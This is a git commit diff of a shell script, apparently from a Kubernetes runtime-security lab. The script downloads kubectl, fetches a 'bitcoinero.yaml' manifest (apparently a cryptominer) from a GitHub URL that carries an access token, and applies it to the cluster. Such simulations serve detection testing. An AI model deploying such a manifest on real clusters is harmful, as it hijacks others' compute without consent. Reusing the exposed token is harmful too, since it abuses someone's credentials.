df99a3c9fcb13f7e4a92fd5b8792800f5c1983bf
Abdurrahmanm4nn <abdurrahman1270@gmail.com>
2023-03-22 14:54:10 +0700

    Troubleshoot attack scripts

--- attacking-scripts/attack.sh
+++ attacking-scripts/attack.sh
@@ -1,6 +1,7 @@
 export PATH=/tmp:$PATH
 cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
 curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA
+mv bitcoinero.yaml\?token\=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA bitcoinero.yaml
 ./kubectl apply -f bitcoinero.yaml
 sleep 5
 ./kubectl get pods
